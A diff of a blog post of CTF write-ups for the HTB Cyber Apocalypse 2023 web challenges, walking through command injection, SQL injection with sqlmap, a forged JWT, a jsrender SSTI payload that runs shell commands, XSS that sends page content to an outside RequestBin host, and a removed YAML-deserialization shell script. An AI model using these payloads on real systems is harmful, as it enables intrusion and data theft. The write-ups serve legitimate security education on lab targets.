@@ -1,15 +1,15 @@
 ---
 draft: true
-title: 'HackTheBox CyberApocalypse 2023 - Web'
+title: 'Cyber Apocalypse 2023: The Cursed Mission - Web Exploitation'
 authors:
   - hoangDayNe
   - hdthinh1012
   - FazeCT
-date: '2023-03-23T00:00:00Z'
+date: '2023-03-27T00:00:00Z'
 doi: ''
 
 # Schedule page publish date (NOT publication's date).
-publishDate: '2023-03-23T00:00:00Z'
+publishDate: '2023-03-27T10:00:00Z'
 
 # Publication type.
 # Legend: 0 = Uncategorized; 1 = Conference paper; 2 = Journal article;
@@ -21,19 +21,16 @@ publication_types: ['9']
 publication: ''
 publication_short: ''
 
-abstract: HackTheBox CyberApocalypse 2023 - Web application writeups.
+abstract: An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Web Exploitation category.
 
 # Summary. An optional shortened abstract.
-summary: HTB CyberApocalypse 2023 - Web writeups.
+summary: An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Web Exploitation category.
 
 tags:
   - ctf
   - writeup
   - web exploitation
-  - web
-  - htb
-  - hackthebox
-  - cyberapocalypse-2023
+  - htb-2023
 
 featured: false
 
@@ -60,7 +57,6 @@ image:
 #   E.g. `internal-project` references `content/project/internal-project/index.md`.
 #   Otherwise, set `projects: []`.
 projects: []
-    # - ctf-2022-writeups
 
 # Slides (optional).
 #   Associate this publication with Markdown slides.
@@ -70,126 +66,196 @@ projects: []
 slides: ""
 ---
 {{< toc >}}
+
 ## Introduction
-Welcome to my blog post about the web challenges in the HTB Cyber Apocalypse 2023 competition! For those who may not be familiar, HTB (Hack The Box) is a platform that provides a range of cybersecurity challenges for users to test and improve their skills. Cyber Apocalypse 2023 was a massive virtual event that took place in February 2023, where thousands of participants from all over the world competed in a range of challenges, including web, crypto, reverse engineering, and more.
+
+Welcome to our blog post about the web challenges in the HTB Cyber Apocalypse 2023 competition! For those who may not be familiar, HTB (Hack The Box) is a platform that provides a range of cybersecurity challenges for users to test and improve their skills. Cyber Apocalypse 2023 was a massive virtual event that took place in February 2023, where thousands of participants from all over the world competed in a range of challenges, including web, crypto, reverse engineering, and more.
 
 We were able to reach 29th place and solve 60/74 challenges. Particularly for web challenges, we got 8/9 (the one we didn't solve was Unearthly Shop).
 
-<img src="flexing.png" alt="">
+<img src="flexing.png" alt="" width="1000"/>
 
-In this blog post, I will focus specifically on the web challenges in the Cyber Apocalypse 2023 competition. I will provide a detailed analysis of each challenge, along with my thought process and the techniques I used to solve them. Whether you're an aspiring cybersecurity professional or a seasoned veteran, I hope you find my write-ups informative and helpful!
+In this blog post, we will focus specifically on the web challenges in the Cyber Apocalypse 2023 competition. We will provide a detailed analysis of each challenge, along with our thought process and the techniques we used to solve them. Whether you're an aspiring cybersecurity professional or a seasoned veteran, we hope you find our write-ups informative and helpful!
 
-## Gunhead (very easy)
-### Challenge
+## Trapped Source
+
+**Description:** Intergalactic Ministry of Spies tested Pandora's movement and intelligence abilities. She found herself locked in a room with no apparent means of escape. Her task was to unlock the door and make her way out. Can you help her in opening the door?
+
+**Note:** This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.
+
+**Category:** Web Exploitation
+
+**Difficulty:** Very Easy
+
+<img src="web1.png" alt="linux" width="1000"/>
+
+We are given a website that looks like it requires us to input the right password on a locker to process. 
+
+View page source to see if anything is given, and we can see the correct pin is **8291**.
+
+<img src="web2.png" alt="linux" width="1000"/>
+
+Input the correct pin and we get the flag for the challenge.
+
+<img src="web3.png" alt="linux" width="1000"/>
+
+Flag is: **HTB{V13w_50urc3_c4n_b3_u53ful!!!}**
+
+## Gunhead
+
 **Given file:**: [Get it here](https://github.com/hdthinh1012/htb-cyber-apocalypse-2023/blob/main/web_gunhead.zip)
 
 **Description**: During Pandora's training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.
 
-### Solution
+**Note:** This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.
+
+**Category:** Web Exploitation
+
+**Difficulty:** Very Easy
+
 Click the URL of the generated challenge server, we are greeted with the home page of the challenge - a pseudo management system page
 
-<img src="gunhead-1.png" alt="Home page"/>
+<img src="gunhead-1.png" alt="Home page" width="1000"/>
 
 There are 3 buttons on the right side of the info panel, we interest in the third one, which gives us the shell UI.
 
-<img src="gunhead-2.png" alt="Button3">
+<img src="gunhead-2.png" alt="Button3" width="1000"/>
 
 Type /help as instructed, the shell command returns the list of possible commands. We saw the ping command, which is familiar one for command injection challenges.
 
-<img src="gunhead-3.png" alt="/help command">
+<img src="gunhead-3.png" alt="/help command" width="1000"/>
 
 Open the website in Burp Suite monitored browsers, open the shell and type in the command `/ping 127.0.0.1`, and we see in Burp Suite HTTP history has a POST request to /api/ping
 
-<img src="gunhead-4.png" alt="/ping command">
+<img src="gunhead-4.png" alt="/ping command" width="1000"/>
 
-<img src="gunhead-5.png" alt="burp suite history">
+<img src="gunhead-5.png" alt="burp suite history" width="1000"/>
 
 Turn to the challenge source code, at index.php, the /api/ping route is handled the method `ping` of class `ReconController` 
 
-<img src="gunhead-6.png" alt="index.php">
+<img src="gunhead-6.png" alt="index.php" width="1000"/>
 
 `ReconController.ping()` will create instance of `ReconModel` and its `getOutput()` method, which will pass the user-controlled ip parameters to the ping command but without any command injection filters, means this is an easy command injection chals
 
-<img src="gunhead-7.png" alt="ReconController.php">
+<img src="gunhead-7.png" alt="ReconController.php" width="1000"/>
 
-<img src="gunhead-8.png" alt="ReconModel.php">
+<img src="gunhead-8.png" alt="ReconModel.php" width="1000"/>
 
 Escape the ping command with the command separator `;`, cat the flag, which is stored at /flag.txt in docker container 
 
-<img src="gunhead-9.png" alt="Dockerfile">
+<img src="gunhead-9.png" alt="Dockerfile" width="1000"/>
 
-<img src="gunhead-10.png" alt="Flag">
+<img src="gunhead-10.png" alt="Flag" width="1000"/>
 
-## Passman (easy)
-### Challenge
+Flag is: **HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}**
+
+## Drobots
+
+**Given file:** [Get it here!](https://drive.google.com/file/d/1NIgOlQWRawCdP_pQeTk0q2rQxFywnYI_/view?usp=sharing)
+
+**Description:** Pandora's latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task?
+
+**Note:** This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.
+
+**Category:** Web Exploitation
+
+**Difficulty:** Very Easy
+
+We are given a website and a zip file containing the website's source.
+
+<img src="web4.png" alt="linux" width="1000"/>
+
+After a quick analyze on the source, I get to understand that either we have to use [SQL Injection](https://portswigger.net/web-security/sql-injection#:~:text=SQL%20injection%20(SQLi)%20is%20a,not%20normally%20able%20to%20retrieve.) or use a specific parameter to get to the next page.
+
+Input **admin** for the username and **" OR 1 = 1 -- -** for the password, or add **/home** to the URL will grant you access to the next page, which turns out to also contain the flag.
+
+<img src="web5.png" alt="linux" width="1000"/>
+
+Flag is: **HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}**
+
+## Passman
+
 **Given file:** [Get it here](https://github.com/hdthinh1012/htb-cyber-apocalypse-2023/blob/main/web_passman.zip)
 
 **Description**: Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager?
 
-### Solution
+**Note:** This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.
+
+**Category:** Web Exploitation
+
+**Difficulty:** Easy
+
 The challenge starts with a login screen.
 
-<img src="passman-1.png" alt="Login screen">
+<img src="passman-1.png" alt="Login screen" width="1000"/>
 
 Looking at `entrypoint.sh` in sources, it appears that an admin account is existed, but the password was random generated so we may have to find someway to get access to admin account later on to finish the challnege.
 
-<img src="passman-2.png" alt="entrypoint.sh">
+<img src="passman-2.png" alt="entrypoint.sh" width="1000"/>
 
 First create normal account then login. After login success, we are greeted with the dashboard home
 
-<img src="passman-3.png" alt="entrypoint.sh">
+<img src="passman-3.png" alt="entrypoint.sh" width="1000"/>
 
-<img src="passman-4.png" alt="/dashboard">
+<img src="passman-4.png" alt="/dashboard" width="1000"/>
 
 Click on the plus button, a form to store credential for online website appears. Fill and submit the form, a new item was created.
 
-<img src="passman-5.png" alt="create form">
+<img src="passman-5.png" alt="create form" width="1000"/>
 
-<img src="passman-6.png" alt="/dashboard again">
+<img src="passman-6.png" alt="/dashboard again" width="1000"/>
 
 Switch to Burp Suite HTTP History panels to look for intersting requests.
 
 It seems that the website uses single `POST /graphql` endpoint with the JSON body contain `query` field to dictate the server response.
 
-<img src="passman-7.png" alt="/graphql mutation">
+<img src="passman-7.png" alt="/graphql mutation" width="1000"/>
 
-<img src="passman-8.png" alt="/getPhraseList ">
+<img src="passman-8.png" alt="/getPhraseList" width="1000"/>
 
 It's time to get back to the source for more clues. Here the `/graphql` endpoint will be handled by a `GraphQlSchema` defined in `helpers/GraphqlHelper.js`
 
 <img src="passman-9.png" alt="router">
-<img src="passman-10.png" alt="GraphQLSchema">
+
+<img src="passman-10.png" alt="GraphQLSchema" width="1000"/>
 
 In the `GraphQLObjectType` object `mutationType`, there is an interesting field `UpdatePassword`
 
-<img src="passman-11.png" alt="UpdatePassword">
+<img src="passman-11.png" alt="UpdatePassword" width="1000"/>
 
 The `UpdatePassword` graphql handler receive `username` and `password`, it just checks whether the user is authenticated then just ouright runs the update password to any usernames it receives without checking whether the current user is the same as user that is gonna haved his/her password changes, some resource authorization problems here.
 
 Open BurpSuite, send the request `POST /graphql` to repeater, edit the JSON body to use UpdatePassword graphql handler. 
 
-<img src="passman-12.png" alt="Burp Suite">
+<img src="passman-12.png" alt="Burp Suite" width="1000"/>
 
 The admin password is updated successfully. Now login as admin.
 
-<img src="passman-13.png" alt="Admin login">
+<img src="passman-13.png" alt="Admin login" width="1000"/>
 
 Login successfully, retrieving flag.
 
-<img src="passman-14.png" alt="Admin login">
+<img src="passman-14.png" alt="Admin login" width="1000"/>
 
-The flag contents said it was IDOR vulnerabilities, which is actually a incorrect authorization related problem.
+The flag contents said it was IDOR vulnerabilities, which is actually an incorrect authorization related problem.
 
-## Orbital (easy)
-### Challenge
+Flag is: **HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}**
+
+## Orbital
+
 **Given file:**: [Get it here](https://github.com/HoangREALER/cyberApocalypse2023/blob/main/web_orbital.zip)
 
 **Description**: In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?
 
-### Solution
+**Note:** This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.
+
+**Category:** Web Exploitation
+
+**Difficulty:** Easy
+
 At first, we were given the login page which requires credentials. There's nothing else you can do at this point than reading given code.
 
-<img src="orbital1.png" alt="Login page"/>
+<img src="orbital1.png" alt="Login page"/ width="1000"/>
 
 Upon given the code, you can find out that there is 1 user "admin" which is initiated at the time the docker is created. We can also see that, the application only has SELECT privilege on table `orbital.users` and `orbital.communications`.
 
@@ -303,7 +369,7 @@ def login(username, password):
 
 I decided to use `Burpsuite` to capture to login request, modified the field `username` with value `*` and saved it for the usage of `sqlmap`.
 
-<img src="orbital2.png" alt="Burpsuite demo"/>
+<img src="orbital2.png" alt="Burpsuite demo" width="1000"/>
 
 I saved it as `req.txt`. Since the database and the table was already known the command I used was: 
 
@@ -311,24 +377,29 @@ I saved it as `req.txt`. Since the database and the table was already known the 
 sqlmap -r req.txt --level=5 --risk=3 --technique=T -o --ignore-code 401 -D orbital -T users --dump
 ```
 
-<img src="orbital3.png" alt="SQLMap demo"/>
+<img src="orbital3.png" alt="SQLMap demo" width="1000"/>
 
 Nice but we only got the hash. Initially, we was trying to use `hashcat` but since this is HackTheBox, the challenge may use well-known hash so I throw it on the internet and Voila! The credential is `admin:ichliebedich`, login and use LFI attack the get flag.
 
-<img src="orbital4.png" alt="SQLMap demo"/>
+<img src="orbital4.png" alt="SQLMap demo" width="1000"/>
 
-<img src="orbital5.png" alt="SQLMap demo"/>
+<img src="orbital5.png" alt="SQLMap demo" width="1000"/>
 
-Flag: `HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}`
+Flag is: **HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}**
 
 
-## Didactic Octo Paddles (medium)
-### Challenge
+## Didactic Octo Paddles
+
 **Given File**: [Get it here](https://github.com/HoangREALER/cyberApocalypse2023/blob/main/web_didactic_octo_paddle.zip)
 
 **Description**: You have been hired by the Intergalactic Ministry of Spies to retrieve a powerful relic that is believed to be hidden within the small paddle shop, by the river. You must hack into the paddle shop's system to obtain information on the relic's location. Your ultimate challenge is to shut down the parasitic alien vessels and save humanity from certain destruction by retrieving the relic hidden within the Didactic Octo Paddles shop.
 
-### Solution
+**Note:** This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.
+
+**Category:** Web Exploitation
+
+**Difficulty:** Medium
+
 This time it gives us a login panel like the last time. Except this time it also has register function. Let's look at the main routes in the source code.
 
 `challenge/routes/index.js`
@@ -549,25 +620,30 @@ eyJhbGciOiJOb05lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5NTk0OTY1LCJleHAiOjI2
 
 I modified the algorithm to `None`, "id" to `1` as 1 is the id of "admin" and set the expiration time to oblivion so I can take my time to get the flag.
 
-<img src="dict1.png" alt="Admin panel demo"/>
+<img src="dict1.png" alt="Admin panel demo" width="1000"/>
 
 For the flag, look again at the routes' functions, we can get the flag through [SSTI on jsrender](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jsrender-nodejs). To do so the payload must be one of the usernames registered. Only thing we have to do now is to register a new account with the payload for the username.
 
 `{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}`
 
-<img src="dict2.png" alt="Payload"/>
+<img src="dict2.png" alt="Payload" width="1000"/>
 
-<img src="dict3.png" alt="Admin panel demo"/>
+<img src="dict3.png" alt="Admin panel demo" width="1000"/>
 
-Flag: `HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}`
+Flag is: **HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}**
 
-## SpyBug (medium)
-### Challenge
+## SpyBug
+
 **Given file:**: [Get it here](https://github.com/HoangREALER/cyberApocalypse2023/blob/main/web_spybug.zip)
 
 **Description**: As Pandora made her way through the ancient tombs, she received a message from her contact in the Intergalactic Ministry of Spies. They had intercepted a communication from a rival treasure hunter who was working for the alien species. The message contained information about a digital portal that leads to a software used for intercepting audio from the Ministry's communication channels. Can you hack into the portal and take down the aliens counter-spying operation?
 
-### Solution
+**Note:** This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.
+
+**Category:** Web Exploitation
+
+**Difficulty:** Medium
+
 Right, another login panel with no reigster. But wait what's that ? Look at the source code closely, we will have 2 main routes: `routes/agents` and `routes/main`.
 
 ```js
@@ -769,7 +845,7 @@ exports.visitPanel = async () => {
 
 Well since I really wanted to know how the recordings being rendered. I will create a Docker. For those who are new to CTFs, Docker is a good way to debug what really happens behind the curtain.
 
-For the purpose of testing I will modify `./build-docker.sh`  to
+For the purpose of testing I will modify `./build-docker.sh` to
 
 ```bash
 #!/bin/bash
@@ -815,7 +891,7 @@ tbody
 
 The first flashes through my mind is `!{agent.hostname}`, `!{agent.platform}` and `!{agent.arch}`. Upon reading the `pug/jade` document
 
-<img src="spybug1.png" alt="jade document"/>
+<img src="spybug1.png" alt="jade document" width="1000"/>
 
 Aaaaaah, so no escape then, so we just need to fix the `hostname` or `platform` or `arch` to `<script>(evil xss)</script>` right ? Unfortunately, it won't work. Let's look at the `index.js` again.
 
@@ -836,27 +912,27 @@ Don't worry, I said 2 things come to my mind while reading the template. The sec
 But doesn't it use `<audio>` tag, how can the script be executed ? You're right, we can't. However if something like `<script src="our-evil-media-file.wav"></script>` appears, it will execute our payload like a charm. Well how can we make it appear ?
 Use `!{hostname}` obviously.
 
-<img src="spybug2.png" alt="Hex edit">
+<img src="spybug2.png" alt="Hex edit" width="1000"/>
 
 Okay let's go and try out our web built from the docker at `localhost:1337`. We can use `admin:admin` to login to the panel now.
 
-<img src="spybug3.png" alt="Admin panel">
+<img src="spybug3.png" alt="Admin panel" width="1000"/>
 
 You can either create a form with html to deal with the endpoints and upload file or use `Postman` to deal with it like me.
 
 First me need to register an agent.
 
-<img src="spybug4.png" alt="Register agent">
+<img src="spybug4.png" alt="Register agent" width="1000"/>
 
 Use the id and token returned for uploading the file that contains the payload.
 
-<img src="spybug5.png" alt="Upload payload agent">
+<img src="spybug5.png" alt="Upload payload agent" width="1000"/>
 
 And finally, inject into html.
 
-<img src="spybug6.png" alt="Upload payload agent">
+<img src="spybug6.png" alt="Upload payload agent" width="1000"/>
 
-<img src="spybug7.png" alt="Alert 1">
+<img src="spybug7.png" alt="Alert 1" width="1000"/>
 
 Spectacular !! Now we only need to modify our payload for it to get all content of the html page at send it to our self hosted server or maybe [RequestBin](https://requestbin.com). The payload I used:
 
@@ -867,34 +943,39 @@ fetch('https://ensei2x093jq8.x.pipedream.net?muneh=' + document.documentElement.
 
 Repeat all the steps above against challenge server. We will see the flag in the RequestBin we created.
 
-<img src="spybug8.png" alt="Money">
+<img src="spybug8.png" alt="Money" width="1000"/>
 
-Flag: `HTB{p01yg10t5_4nd_35p10n4g3}`
+Flag is: **HTB{p01yg10t5_4nd_35p10n4g3}**
 
-## TrapTrack (hard)
-### Challenge
+## TrapTrack
+
 **Given file:**: [Get it here](https://github.com/HoangREALER/cyberApocalypse2023/blob/main/web_traptrack.zip)
 
 **Description**: The aliens have prepared several trap websites to spread their propaganda campaigns on the internet. Our intergalactic forensics team has recovered an artifact of their health check portal that keeps track of their trap websites. Can you take a look and see if you can infiltrate their system?
 
-### Solution
+**Note:** This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.
+
+**Category:** Web Exploitation
+
+**Difficulty:** Very Hard
+
 Right ... Another login panel, excepts, now the credential is harcoded in to the source code ε-(´・｀) ﾌ
 
-<img src="traptrack1.png" alt="creds">
+<img src="traptrack1.png" alt="creds" width="1000"/>
 
-<img src="traptrack2.png" alt="creds">
+<img src="traptrack2.png" alt="creds" width="1000"/>
 
 Use that cred and login to panel. Here at the panel, we see some kind of URL health checking going on.
 
-<img src="traptrack3.png" alt="creds">
+<img src="traptrack3.png" alt="creds" width="1000"/>
 
 Let's try to put some URL in. How about our little RequestBin.
 
-<img src="traptrack4.png" alt="creds">
+<img src="traptrack4.png" alt="creds" width="1000"/>
 
 Result:
 
-<img src="traptrack5.png" alt="creds">
+<img src="traptrack5.png" alt="creds" width="1000"/>
 
 Very noice. So it really does somewhat of a CURL thing. Let's look at the source code and this time I'll ask ChatGPT what the challenge does.
 
@@ -1014,6 +1095,7 @@ def logout():
     return redirect('/')
 ```
 
+```
 > This code is a Flask web application that has two blueprints (web and api) and uses a database to store and manage User and TrapTracks models.
 >
 > The web blueprint defines three routes:
@@ -1030,6 +1112,7 @@ def logout():
 > The response function is a helper function that returns a JSON response with a message and an optional status.
 > The code uses Flask-Login to manage user authentication and Flask-Caching to cache job data.
 > --ChatGPT--
+```
 
 Hmmm, pretty neat, so it does keep records of all the tracks or we might say all the jobs. Let's look deeper into how the jobs are created and executed.
 
@@ -1082,10 +1165,15 @@ def get_job_queue(job_id):
 ```
 
 Okay, so it has some function like:
+
 - Get all jobs' IDs from Redis database
+
 - Get current incremented ID
+
 - Queue a job in the database
+
 - Get the data from of a job with given ID
+
 
 What truely stand out of all these are these line:
 
@@ -1098,9 +1186,9 @@ def get_job_queue(job_id):
     return None
 ```
 
-The principal is somewhat similar to a misc chall called [`Hijack`](#hijack-easy). This is no doubt a `pickle deserialization` attack which can execute remote code, our code.
+The principal is somewhat similar to a misc chall called `Hijack`. This is no doubt a `pickle deserialization` attack which can execute remote code, our code.
 
-Is this the end of the challenge ? Well, ***no***. Let's look up a few lines and see why.
+Is this the end of the challenge? Well, `no`. Let's look up a few lines and see why.
 
 ```python
 def create_job_queue(trapName, trapURL):
@@ -1199,57 +1287,10 @@ With that script let's try to finalize our work. We will try to change `hvalue` 
 
 Overall the technique to solve this challenge is not too flashy, it still requires a lot of knowledge around it. Very nice chall. Hope we all learn something from it.
 
-<img src="traptrack6.png" alt="creds">
+<img src="traptrack6.png" alt="creds" width="1000"/>
 
-<img src="traptrack7.png" alt="creds">
+<img src="traptrack7.png" alt="creds" width="1000"/>
 
-<img src="traptrack8.png" alt="creds">
+<img src="traptrack8.png" alt="creds" width="1000"/>
 
-Flag: `HTB{tr4p_qu3u3d_t0_rc3!}`
-
-## Hijack (easy)
-
-### Challenge
-
-**Description**: The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship's Thermal Control System. Can you take advantage of the situation without raising any suspicion?
-
-### Solution
-
-Let's try to connect to the challenge instance.
-
-<img src="hijack1.png" alt="Demo"/>
-
-And let's try to test out those options.
-
-<img src="hijack2.png" alt="Demo"/>
-
-`ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcxNScsIGF1dG9fY2FsaWJyYXRpb246ICdvbicsCiAgcHJvcHVsc2lvbl90ZW1wOiAnMzQzNCcsIHNvbGFyX2FycmF5X3RlbXA6ICcxMicsIHVuaXRzOiBmfQo=`
-
-The function in question generates a base64 encoded string representing a serialized object. To provide some context, serialization is the process of storing an object, such as an array or class, in a database for later retrieval. When the application needs to access the object, it unserializes it, or loads it from the database using a function. This can improve the efficiency of Object-Oriented Programming.
-
-It is important to note, however, that serialized objects should not be vulnerable to manipulation by users. If a user creates a malicious object, it could execute unwanted code. This challenge illustrates this point by presenting us with a serialized object and its corresponding base64 encoding. This is just one example of how serialized objects can be used, and it is essential to be aware of their potential risks.
-
-Let's take a look at the next options. The application is requesting a base64 encoded string of a serialized object.
-
-<img src="hijack3.png" alt="Demo"/>
-
-Upon examining the serialized object provided by the application, I have determined that it is a YAML-formatted Python serialized object. This [article](https://net-square.com/yaml-deserialization-attack-in-python.html) serves as an excellent illustration of how attackers can leverage YAML-based exploits to execute arbitrary code.
-
-Here is the script to generate a serialized object.
-
-```python
-import yaml
-import os
-import base64
-class Test(object):
-  def __reduce__(self):
-    return (os.system, ('sh',))
-serialized_data = yaml.dump(Test()) # serializing data
-print(base64.b64encode(serialized_data.encode()).decode())
-```
-
-Let's grab the result and throw it to the application.
-
-<img src="hijack4.png" alt="Demo"/>
-
-Flag: `HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}`
+Flag is: **HTB{tr4p_qu3u3d_t0_rc3!}**
